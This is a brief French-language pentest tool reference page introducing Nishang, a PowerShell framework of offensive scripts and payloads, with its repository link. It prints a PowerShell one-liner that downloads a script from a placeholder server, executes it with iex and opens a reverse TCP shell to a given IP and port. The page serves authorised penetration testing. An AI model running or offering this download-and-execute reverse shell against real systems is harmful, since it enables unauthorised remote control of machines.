---
title: "Nishang"
date: 2025-05-07T15:00:00+02:00
draft: false
tags: ["Outils", "Pentester"]
categories: ["Outils"]
summary: "Nishang"
showToc: true
tocOpen: true
---
 Nishang est un framework et un ensemble de scripts et de charges utiles permettant d'utiliser PowerShell pour la sécurité offensive, les tests d'intrusion et le red teaming. Nishang est utile à toutes les phases des tests d'intrusion.
 
```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

https://github.com/samratashok/nishang